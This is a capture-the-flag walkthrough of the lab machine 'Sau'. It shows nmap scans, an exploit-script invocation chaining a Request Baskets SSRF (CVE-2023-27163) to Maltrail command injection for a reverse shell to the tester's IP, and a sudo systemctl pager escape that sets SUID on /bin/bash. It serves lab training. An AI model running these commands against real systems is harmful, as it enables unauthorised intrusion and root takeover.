---------------
Sau is an Easy Difficulty Linux machine that features a Request Baskets instance that is vulnerable to Server-Side Request Forgery (SSRF) via [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163). Leveraging the vulnerability we are to gain access to a Maltrail instance that is vulnerable to Unauthenticated OS Command Injection, which allows us to gain a reverse shell on the machine as puma. A sudo misconfiguration is then exploited to gain a root shell.

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS -sU 10.10.11.224 -p- -T4 --min-rate 5000 -oN all_ports.txt --open -n -Pn -v
```

![](/assets/Sau/1.png)
<br />
<br />
<br />

There are **2 open ports**:
+ **22/tcp**
+ **55555/tcp**

<br />
Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.10.224 -p 22,55555 -T4 --min-rate 5000 -oX open_ports.xml -oN open_ports.txt --version-all -n -Pn -A -v
```

![](/assets/Sau/2.png)
<br />
<br />
<br />

We can see that the services correspond to:
+ **22/tcp OpenSSH 8.2p1**
+ **55555/tcp unknown**

<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.10.224 -p 22,55555 -T4 --min-rate 5000 --script="vuln and safe or intrusive and safe or discovery" -oN vulns.txt -oX vulns.xml -n -Pn -v
```

<br />
<br />

Which didn't return anything.

### Foothold

This machine's foothold was very straightforward, a **single exploit** was required to gain the foothold, this exploit leveraged an **SSRF vulnerability** to **upload a reverse shell**.

<br />

The first thing I notice when entering the **website** on **port 55555/tcp** is a **version number**:
![](/assets/Sau/4.png)
<br />
<br />
<br />

A quick search revealed a **CVE**:
![](/assets/Sau/5.png)
<br />
<br />
<br />

So I used an [exploit](https://github.com/davuXVI/CVE-2023-27163) from *davuXVI* to get the foothold:

```bash
./CVE_2023_27163.sh -i 10.10.11.224 -f localhost:80 -t 10.10.16.9
```

<br />
<br />
<br />

And just like that we got the user flag:

<br />
<br />
<br />

<br />
### Privilege Escalation

This machine's privilege escalation is very funny, as it's through a **pager**, which I personally enjoy so much.

<br />

Enumerating possible privilege escalation vectors we discover that we can **execute `systemctl` with `sudo`**:

<br />
<br />
<br />

After a glimpse at [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/) we know how to escalate privilege:
![](/assets/Sau/9.png)
<br />
<br />
<br />

However, when we run the command, no pager is invoked:
![](/assets/Sau/10.png)
<br />
<br />
<br />

This is due we are not in an actual tty, we can fix this running:

```bash
script /dev/null -c bash
```

<br />

We can test if it worked by running this command and receiving a tty size:

```bash
stty size
```

![](/assets/Sau/11.png)
<br />
<br />
<br />

Now everything works and the pager is invoked, we can **run a command prepended by an exclamation mark to run a command**, like assigning SUID privilege to the bash binary:

```bash
!chmod u+s /bin/bash
```

![](/assets/Sau/12.png)
<br />
<br />
<br />

Now we just have to **leverage the SUID permission** running `bash -p` and get the root flag:
